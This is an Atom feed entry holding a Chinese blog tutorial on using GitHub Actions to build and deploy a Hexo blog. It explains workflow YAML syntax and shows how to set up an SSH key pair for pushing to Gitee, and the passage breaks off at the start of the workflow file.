<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>第二天堂</title>
  <icon>https://www.gravatar.com/avatar/fdb3f366afd887d068eede6e9b2c81d0</icon>
  <subtitle>简单的生活，更少的期待，更多的付出。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.yanzhe.tk/"/>
  <updated>2020-08-23T01:48:10.235Z</updated>
  <id>https://blog.yanzhe.tk/</id>
  
  <author>
    <name>颜哲</name>
    <email>yanzhe919@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GitHub Actions 示例 - Hexo CI/CD</title>
    <link href="https://blog.yanzhe.tk/2020/08/24/use-GitHubAction-build/"/>
    <id>https://blog.yanzhe.tk/2020/08/24/use-GitHubAction-build/</id>
    <published>2020-08-24T00:23:03.000Z</published>
    <updated>2020-08-23T01:48:10.235Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://docs.github.com/cn/actions/getting-started-with-github-actions/about-github-actions">GitHub Actions</a> 是 GitHub 的<a href="http://www.ruanyifeng.com/blog/2015/09/continuous-integration.html">持续集成服务</a>，于2018年10月<a href="https://github.blog/changelog/2018-10-16-github-actions-limited-beta/">推出</a>。</p><p>通过 GitHub Actions 持续集成 Hexo ，可以 <code>clone</code> 后，只需写 Markdown ，<code>push</code> md 。</p><h1 id="GitHub-Actions-是什么？"><a href="#GitHub-Actions-是什么？" class="headerlink" title="GitHub Actions 是什么？"></a>GitHub Actions 是什么？</h1><p>大家知道，持续集成由很多操作组成，比如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。GitHub 把这些操作就称为 actions。</p><p>很多操作在不同项目里面是类似的，完全可以共享。GitHub 注意到了这一点，想出了一个很妙的点子，允许开发者把每个操作写成独立的脚本文件，存放到代码仓库，使得其他开发者可以引用。</p><p>如果你需要某个 action，不必自己写复杂的脚本，直接引用他人写好的 action 即可，整个持续集成过程，就变成了一个 actions 的组合。这就是 GitHub Actions 最特别的地方。</p><p>工作流程是您可以在仓库中创建的自定义自动化流程，用于在 GitHub 上构建、测试、封装、发行或部署任何代码项目。</p><p>通过 GitHub 操作 可直接在仓库中构建端到端持续集成 (CI) 和持续部署 (CD) 功能。 GitHub 操作 支持 GitHub 的内置持续集成服务。</p><p>GitHub 做了一个<a href="https://github.com/marketplace?type=actions">官方市场</a>，可以搜索到他人提交的 actions。另外，还有一个 <a href="https://github.com/sdras/awesome-actions">awesome actions</a> 的仓库，也可以找到不少 action。</p><p><img data-src="bg2019091105.jpg" alt="img"></p><p>上面说了，每个 action 就是一个独立脚本，因此可以做成代码仓库，使用<code>userName/repoName</code>的语法引用 action。比如，<code>actions/setup-node</code>就表示<code>github.com/actions/setup-node</code>这个<a href="https://github.com/actions/setup-node">仓库</a>，它代表一个 action，作用是安装 Node.js。事实上，GitHub 官方的 actions 都放在 <a href="https://github.com/actions">github.com/actions</a> 里面。</p><p>既然 actions 是代码仓库，当然就有版本的概念，用户可以引用某个具体版本的 action。下面都是合法的 action 引用，用的就是 Git 的指针概念，详见<a href="https://help.github.com/en/articles/about-actions#versioning-your-action">官方文档</a>。</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actions/setup-node@74bc508 <span class="comment"># 指向一个 commit</span></span><br><span class="line">actions/setup-node@v1.0    <span class="comment"># 指向一个标签</span></span><br><span class="line">actions/setup-node@master  <span class="comment"># 指向一个分支</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="免费使用额度"><a href="#免费使用额度" class="headerlink" title="免费使用额度"></a>免费使用额度</h2><p>公共仓库免费使用 GitHub 操作。 对于私有仓库，每个 GitHub 帐户可获得一定数量的免费记录和存储，具体取决于帐户所使用的产品。</p><p>分钟数每月都会重置，而存储使用量不重置。</p><table><thead><tr><th align="left">产品</th><th align="left">存储器</th><th align="left">分钟数（每月）</th></tr></thead><tbody><tr><td align="left">GitHub Free</td><td align="left">500 MB</td><td align="left">2,000</td></tr></tbody></table><blockquote><p><a href="https://docs.github.com/cn/github/setting-up-and-managing-billing-and-payments-on-github/about-billing-for-github-actions">关于 GitHub 操作的计费</a></p></blockquote><h2 id="使用限制"><a href="#使用限制" class="headerlink" title="使用限制"></a>使用限制</h2><p>使用限制可能会有变动，需查看官方。</p><ul><li><p><strong>作业执行时间</strong> - 工作流程中的每个作业最多可以运行 6 个小时。</p></li><li><p><strong>工作流程运行时间</strong> - 每个工作流程的运行时限为 72 小时。</p></li><li><p><strong>作业排队时间</strong> - 自托管运行器的每个作业最多可排队 24 小时。</p></li><li><p><strong>API 请求</strong> - 在一个仓库的所有操作中，一个小时内最多可执行 1000 个 API 请求。</p></li><li><p><strong>并发作业</strong></p><ul><li><table><thead><tr><th align="left">GitHub 计划</th><th align="left">同时运行的作业总数</th><th align="left">MacOS 作业同时运行的最大数量</th></tr></thead><tbody><tr><td align="left">免费</td><td align="left">20</td><td align="left">5</td></tr></tbody></table></li></ul></li><li><p><strong>作业矩阵</strong> - 作业矩阵在每次工作流程运行时最多可生成 256 个作业。</p></li></ul><blockquote><p><a href="https://docs.github.com/cn/actions/getting-started-with-github-actions/about-github-actions#usage-limits">使用限制</a></p></blockquote><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>GitHub Actions 有一些自己的术语。</p><p>（1）<strong>workflow</strong> （工作流程）：持续集成一次运行的过程，就是一个 workflow。</p><p>（2）<strong>job</strong> （任务/作业）：一个 workflow 由一个或多个 jobs 构成，含义是一次持续集成的运行，可以完成多个任务。</p><p>（3）<strong>step</strong>（步骤）：每个 job 由多个 step 构成，一步步完成。</p><p>（4）<strong>action</strong> （动作/操作）：每个 step 可以依次执行一个或多个命令（action）。</p><h2 id="workflow-文件"><a href="#workflow-文件" class="headerlink" title="workflow 文件"></a>workflow 文件</h2><p>GitHub Actions 的配置文件叫做 workflow 文件，必须存放在代码仓库的<code>.github/workflows</code>目录。</p><p>workflow 文件采用 <a href="http://www.ruanyifeng.com/blog/2016/07/yaml.html">YAML 格式</a>，文件名可以任意取，但是后缀名统一为<code>.yml</code>，比如<code>foo.yml</code>。一个库可以有多个 workflow 文件。GitHub 只要发现<code>.github/workflows</code>目录里面有<code>.yml</code>文件，就会自动运行该文件。</p><p>workflow 文件的配置字段非常多，详见<a href="https://help.github.com/cn/articles/workflow-syntax-for-github-actions">官方文档</a>。下面是一些基本字段。</p><h3 id="name"><a href="#name" class="headerlink" title="name"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>name</code></strong></a></h3><p>工作流程的名称。 GitHub 在仓库的操作页面上显示工作流程的名称。 如果省略 <code>name</code>，GitHub 将其设置为相对于仓库根目录的工作流程文件路径。</p><h3 id="on"><a href="#on" class="headerlink" title="on"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>on</code></strong></a></h3><p><strong>必要</strong> 触发工作流程的 GitHub 事件的名称。 您可以提供单一事件 <code>string</code>、事件的 <code>array</code>、事件 <code>types</code> 的 <code>array</code> 或事件配置 <code>map</code>，以安排工作流程的运行，或将工作流程的执行限于特定文件、标记或分支更改。 有关可用事件的列表，请参阅“<a href="https://docs.github.com/cn/articles/events-that-trigger-workflows">触发工作流程的事件</a>”。</p><h5 id="使用单一事件的示例"><a href="#使用单一事件的示例" class="headerlink" title="使用单一事件的示例"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#使用单一事件的示例"><strong>使用单一事件的示例</strong></a></h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Trigger on push</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">push</span></span><br></pre></td></tr></table></figure><h5 id="使用事件列表的示例"><a href="#使用事件列表的示例" class="headerlink" title="使用事件列表的示例"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#使用事件列表的示例"><strong>使用事件列表的示例</strong></a></h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Trigger the workflow on push or pull request</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">[push,</span> <span class="string">pull_request]</span></span><br></pre></td></tr></table></figure><p>除了代码库事件，GitHub Actions 也支持外部事件触发，或者定时运行。</p><h3 id="on-lt-event-name-gt-types"><a href="#on-lt-event-name-gt-types" class="headerlink" title="on.&lt;event_name&gt;.types"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>on.&lt;event_name&gt;.types</code></strong></a></h3><p>选择将触发工作流程运行的活动类型。 大多数 GitHub 事件由多种活动触发。 例如，发布资源的事件在发行版 <code>published</code>、<code>unpublished</code>、<code>created</code>、<code>edited</code>、<code>deleted</code> 或 <code>prereleased</code> 时触发。 通过 <code>types</code> 关键词可缩小触发工作流程运行的活动类型的范围。 如果只有一种活动类型可触发 web 挂钩事件，就没有必要使用 <code>types</code> 关键词。</p><p>您可以使用事件 <code>types</code> 的数组。 有关每个事件及其活动类型的更多信息，请参阅“<a href="https://docs.github.com/cn/articles/events-that-trigger-workflows#webhook-events">触发工作流程的事件</a>”。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Trigger the workflow on pull request activity</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">release:</span></span><br><span class="line">    <span class="comment"># Only use the types keyword to narrow down the activity types that will trigger your workflow.</span></span><br><span class="line">    <span class="attr">types:</span> <span class="string">[published,</span> <span class="string">created,</span> <span class="string">edited]</span></span><br></pre></td></tr></table></figure><h3 id="on-lt-push-pull-request-gt-lt-branches-tags-gt"><a href="#on-lt-push-pull-request-gt-lt-branches-tags-gt" class="headerlink" title="on.&lt;push|pull_request&gt;.&lt;branches|tags&gt;"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>on.&lt;push|pull_request&gt;.&lt;branches|tags&gt;</code></strong></a></h3><p>使用 <code>push</code> 和 <code>pull_request</code> 事件时，您可以将工作流配置为在特定分支或标记上运行。 对于 <code>pull_request</code> 事件，只评估基础上的分支和标签。 如果只定义 <code>tags</code> 或只定义 <code>branches</code>，则影响未定义 Git ref 的事件不会触发工作流程运行。</p><p><code>branches</code>、<code>branches-ignore</code>、<code>tags</code> 和 <code>tags-ignore</code> 关键词接受使用 <code>*</code> 和 <code>**</code> 通配符匹配多个分支或标记名称的 glob 模式。 更多信息请参阅“<a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet">过滤器模式备忘清单</a>”。</p><h4 id="包括分支和标记的示例"><a href="#包括分支和标记的示例" class="headerlink" title="包括分支和标记的示例"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#example-including-branches-and-tags">包括分支和标记的示例</a></h4><p>在 <code>branches</code> 和 <code>tags</code> 中定义的模式根据 Git ref 的名称进行评估。 例如，在 <code>branches</code> 中定义的模式 <code>mona/octocat</code> 将匹配 <code>refs/heads/mona/octocat</code> Git ref。 模式 <code>releases/**</code> 将匹配 <code>refs/heads/releases/10</code> Git ref。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="comment"># Sequence of patterns matched against refs/heads</span></span><br><span class="line">    <span class="attr">branches:</span>    </span><br><span class="line">      <span class="comment"># Push events on master branch</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">      <span class="comment"># Push events to branches matching refs/heads/mona/octocat</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">'mona/octocat'</span></span><br><span class="line">      <span class="comment"># Push events to branches matching refs/heads/releases/10</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">'releases/**'</span></span><br><span class="line">    <span class="comment"># Sequence of patterns matched against refs/tags</span></span><br><span class="line">    <span class="attr">tags:</span>        </span><br><span class="line">      <span class="bullet">-</span> <span class="string">v1</span>             <span class="comment"># Push events to v1 tag</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">v1.*</span>           <span class="comment"># Push events to v1.0, v1.1, and v1.9 tags</span></span><br></pre></td></tr></table></figure><h3 id="on-lt-push-pull-request-gt-paths"><a href="#on-lt-push-pull-request-gt-paths" class="headerlink" title="on.&lt;push|pull_request&gt;.paths"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>on.&lt;push|pull_request&gt;.paths</code></strong></a></h3><p>使用 <code>push</code> 和 <code>pull_request</code> 事件时，您可以将工作流程配置为在至少一个文件不匹配 <code>paths-ignore</code> 或至少一个修改的文件匹配配置的 <code>paths</code> 时运行。 路径过滤器不评估是否推送到标签。</p><p><code>paths-ignore</code> 和 <code>paths</code> 关键词接受使用 <code>*</code> 和 <code>**</code> 通配符匹配多个路径名称的 glob 模式。 更多信息请参阅“<a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet">过滤器模式备忘清单</a>”。</p><h3 id="jobs-lt-job-id-gt"><a href="#jobs-lt-job-id-gt" class="headerlink" title="jobs.&lt;job_id&gt;"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>jobs.&lt;job_id&gt;</code></strong></a></h3><p>每项作业必须关联一个 ID。 键值 <code>job_id</code> 是一个字符串，其值是作业配置数据的映像。 必须将 <code>替换为 `jobs` 对象唯一的字符串。</code> 必须以字母或 <code>_</code> 开头，并且只能包含字母数字字符、<code>-</code> 或 <code>_</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">my_first_job:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">My</span> <span class="string">first</span> <span class="string">job</span></span><br><span class="line">  <span class="attr">my_second_job:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">My</span> <span class="string">second</span> <span class="string">job</span></span><br></pre></td></tr></table></figure><h3 id="jobs-lt-job-id-gt-needs"><a href="#jobs-lt-job-id-gt-needs" class="headerlink" title="jobs.&lt;job_id&gt;.needs"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>jobs.&lt;job_id&gt;.needs</code></strong></a></h3><p>识别在此作业运行之前必须成功完成的任何作业。 它可以是一个字符串，也可以是字符串数组。 如果某个作业失败，则所有需要它的作业都会被跳过，除非这些作业使用让该作业继续的条件语句。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">job1:</span></span><br><span class="line">  <span class="attr">job2:</span></span><br><span class="line">    <span class="attr">needs:</span> <span class="string">job1</span></span><br><span class="line">  <span class="attr">job3:</span></span><br><span class="line">    <span class="attr">needs:</span> <span class="string">[job1,</span> <span class="string">job2]</span></span><br></pre></td></tr></table></figure><p>在此示例中，<code>job1</code> 必须在 <code>job2</code> 开始之前成功完成，而 <code>job3</code> 要等待 <code>job1</code> 和 <code>job2</code> 完成。</p><p>此示例中的作业按顺序运行：</p><ol><li><code>job1</code></li><li><code>job2</code></li><li><code>job3</code></li></ol><h3 id="jobs-runs-on"><a href="#jobs-runs-on" class="headerlink" title="jobs..runs-on"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>jobs..runs-on</code></strong></a></h3><p><strong>必需</strong>运行作业的机器类型。 机器可以是 GitHub 托管的运行器或自托管的运行器。</p><h4 id="GitHub-托管的运行器"><a href="#GitHub-托管的运行器" class="headerlink" title="GitHub 托管的运行器"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#">GitHub 托管的运行器</a></h4><p>如果使用 GitHub 托管的运行器，每个作业将在 <code>runs-on</code> 指定的虚拟环境的新实例中运行。</p><p>可用的 GitHub 托管的运行器类型包括：</p><table><thead><tr><th align="left">虚拟环境</th><th align="left">YAML 工作流程标签</th></tr></thead><tbody><tr><td align="left">Windows Server 2019</td><td align="left"><code>windows-latest</code> 或 <code>windows-2019</code></td></tr><tr><td align="left">Ubuntu 20.04</td><td align="left"><code>ubuntu-20.04</code></td></tr><tr><td align="left">Ubuntu 18.04</td><td align="left"><code>ubuntu-latest</code> 或 <code>ubuntu-18.04</code></td></tr><tr><td align="left">Ubuntu 16.04</td><td align="left"><code>ubuntu-16.04</code></td></tr><tr><td align="left">macOS Catalina 10.15</td><td align="left"><code>macos-latest</code> 或 <code>macos-10.15</code></td></tr></tbody></table><p><strong>注：</strong>Ubuntu 20.04 虚拟环境目前仅作为预览提供。 <code>ubuntu-latest</code> YAML 工作流程标签仍使用 Ubuntu 18.04 虚拟环境。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#示例-4"><strong>示例</strong></a></h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br></pre></td></tr></table></figure><p>更多信息请参阅“<a href="https://docs.github.com/cn/github/automating-your-workflow-with-github-actions/virtual-environments-for-github-hosted-runners">GitHub 托管的运行器的虚拟环境</a>”。</p><h3 id="jobs-lt-job-id-gt-steps"><a href="#jobs-lt-job-id-gt-steps" class="headerlink" title="jobs.&lt;job_id&gt;.steps"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#"><strong><code>jobs.&lt;job_id&gt;.steps</code></strong></a></h3><p>作业包含一系列任务，称为 <code>steps</code>。 步骤可以运行命令、运行设置任务，或者运行您的仓库、公共仓库中的操作或 Docker 注册表中发布的操作。 并非所有步骤都会运行操作，但所有操作都会作为步骤运行。 每个步骤在运行器环境中以其自己的进程运行，且可以访问工作区和文件系统。 因为步骤以自己的进程运行，所以步骤之间不会保留环境变量的更改。 GitHub 提供内置的步骤来设置和完成作业。</p><p>在工作流程的使用限制之内可运行无限数量的步骤。 更多信息请参阅“<a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#usage-limits">使用限制</a>”。</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><a href="https://docs.github.com/cn/actions/reference/workflow-syntax-for-github-actions#example">示例</a></h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Greeting</span> <span class="string">from</span> <span class="string">Mona</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span> <span class="string">push</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">my-job:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">My</span> <span class="string">Job</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">a</span> <span class="string">greeting</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">MY_VAR:</span> <span class="string">Hi</span> <span class="string">there!</span> <span class="string">My</span> <span class="string">name</span> <span class="string">is</span></span><br><span class="line">        <span class="attr">FIRST_NAME:</span> <span class="string">Mona</span></span><br><span class="line">        <span class="attr">MIDDLE_NAME:</span> <span class="string">The</span></span><br><span class="line">        <span class="attr">LAST_NAME:</span> <span class="string">Octocat</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">$MY_VAR</span> <span class="string">$FIRST_NAME</span> <span class="string">$MIDDLE_NAME</span> <span class="string">$LAST_NAME.</span></span><br></pre></td></tr></table></figure><h1 id="示例：使用-GitHub-Actions-发布-Hexo"><a href="#示例：使用-GitHub-Actions-发布-Hexo" class="headerlink" title="示例：使用 GitHub Actions 发布 Hexo"></a>示例：使用 GitHub Actions 发布 Hexo</h1><h2 id="准备通过SSH推送到Gitee的公私钥"><a href="#准备通过SSH推送到Gitee的公私钥" class="headerlink" title="准备通过SSH推送到Gitee的公私钥"></a>准备通过SSH推送到Gitee的公私钥</h2><p>因为Gitee 推送方式不同，现在只开放了 OpenAPI 和 OAuth。</p><p>gitee也有令牌，但是gitee的令牌暂时不支持像github的token那样有推送代码的权限，gitee的推送有两种方式：</p><ol><li>通过https协议使用用户名、密码推送 <code>https://用户名:密码@gitee.com/用户/仓库名.git</code></li><li>通过ssh协议，使用私钥文件免密推送 <code>git @ gitee.com/用户/仓库名.git</code></li></ol><p>本文使用 SSH ，直接通过添加用户私钥文件免密推送。</p><p>SSH 密钥对总是成双出现的，一把公钥，一把私钥。公钥可以自由的放在您所需要连接的 SSH 服务器上，而私钥必须稳妥的保管好。</p><p>所谓”公钥登录”，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录 shell，不再要求密码。这样子，我们即可保证了整个登录过程的安全，也不会受到中间人攻击。</p><h3 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h3><p>我们可以使用 <code>ssh-keygen</code> 命令生成密钥对</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -o -a <span class="number">100</span> -t ed25519 -f ~/.ssh/id_ed25519_gitee -C <span class="string">"yanzhe919@gmail.com"</span></span><br><span class="line"><span class="comment"># 回车</span></span><br><span class="line">Generating public/private ed25519 key pair.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line"><span class="comment"># 直接回车，不对私钥进行加密</span></span><br><span class="line">Enter same passphrase again:</span><br><span class="line"><span class="comment"># 直接回车，不对私钥进行加密</span></span><br><span class="line">Your identification has been saved in ~/.ssh/id_ed25519_gitee</span><br><span class="line">Your public key has been saved in ~/.ssh/id_ed25519_gitee.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:/yiMQf77gwuiqR/Mx6BDoBW+GDxo37C6IMtGg+Gl4Yc yanzhe919@gmail.com</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+--[ED25519 256]--+</span></span><br><span class="line"><span class="string">|  .              |</span></span><br><span class="line"><span class="string">|o. .             |</span></span><br><span class="line"><span class="string">|++o.             |</span></span><br><span class="line"><span class="string">|==oo+ .          |</span></span><br><span class="line"><span class="string">|*oBo +  S        |</span></span><br><span class="line"><span class="string">|oE.+  o  .       |</span></span><br><span class="line"><span class="string">|*.* + .= ..      |</span></span><br><span class="line"><span class="string">|++.= ...= .o     |</span></span><br><span class="line"><span class="string">|+=+     o=o..    |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><p><a href="http://www.cs.berkeley.edu/~dawnsong/papers/randomart.pdf">randomart image</a> 是 OpenSSH 5.1 引入的一种简单的识别指纹 (fingerprint) 的图像。</p><blockquote><p><strong>ed25519</strong>是目前最安全、加解密速度最快的key类型。Ed25519公钥更为紧凑，仅68个字符。生成密钥和签名的过程都非常快，使用Ed25519进行批量签名验证也很快。它是为防碰撞而设计的，防哈希冲突。</p><p>Ed25519 的安全性在 RSA 2048 与 RSA 4096 之间，且性能在数十倍以上。</p><p>如果可以的话，优先选择<strong>ed25519</strong>，否则选择<strong>rsa 3072/4096</strong>。如果使用RSA密钥，则美国国家科学技术研究院在<a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57Pt3r1.pdf">出版物800-57第3部分（PDF）中</a>建议密钥大小至少为2048位。</p></blockquote><h3 id="分别配置密钥对"><a href="#分别配置密钥对" class="headerlink" title="分别配置密钥对"></a>分别配置密钥对</h3><h4 id="公钥放入-Gitee"><a href="#公钥放入-Gitee" class="headerlink" title="公钥放入 Gitee"></a>公钥放入 Gitee</h4><p>找到 <code>~/.ssh/</code> 下 生成的 <code>id_ed25519_gitee.pub</code> ，在 Gitee Web 界面中，添加到 <a href="https://gitee.com/profile/sshkeys">Gitee SSH 公钥</a> 。</p><p><img data-src="28152030_EgY9.png" alt="Gitee SSH 公钥添加"></p><p>如果需要在本地进行验证，可在 <code>~/.ssh/</code> 下修改 <code>config</code> 文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host gitee.com</span><br><span class="line"> HostName gitee.com</span><br><span class="line"> User yanzhe</span><br><span class="line"> PreferredAuthentications publickey</span><br><span class="line"> IdentityFile ~/.ssh/id_ed25519_gitee</span><br><span class="line"> IdentityFile ~/.ssh/id_rsa_gitee</span><br></pre></td></tr></table></figure><p>添加后，在终端（Terminal）中输入</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T git<span class="variable">@gitee</span>.com</span><br></pre></td></tr></table></figure><p>若返回</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome <span class="keyword">to</span> <span class="module-access"><span class="module"><span class="identifier">Gitee</span>.</span></span>com, yourname!</span><br></pre></td></tr></table></figure><p>则证明添加成功。</p><h4 id="私钥放入-GitHub"><a href="#私钥放入-GitHub" class="headerlink" title="私钥放入 GitHub"></a>私钥放入 GitHub</h4><p>将 <code>id_ed25519_gitee</code> 私钥，拷贝配置在 GitHub Blog 仓库的 <code>Settings</code> -&gt; <code>Secrets</code> -&gt; <strong>Add a new secret</strong>，添加 <code>ID_ED25519_GITEE</code> ，Value 部分直接拷贝私钥内容。</p><blockquote><p>具体步骤可参考 <a href="https://docs.github.com/cn/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository">为仓库创建加密密码</a> 。</p><p>同时，觉得直接放入私钥不安全的，可以再使用 <code>gpg</code> 在本地对您的凭据加密。</p></blockquote><h2 id="准备-workflows-yaml-文件"><a href="#准备-workflows-yaml-文件" class="headerlink" title="准备 workflows yaml 文件"></a>准备 workflows yaml 文件</h2><p>在这个仓库的<code>.github/workflows</code>目录，生成一个 workflow 文件，名字可以随便取，这个示例是<code>deployment.yml</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 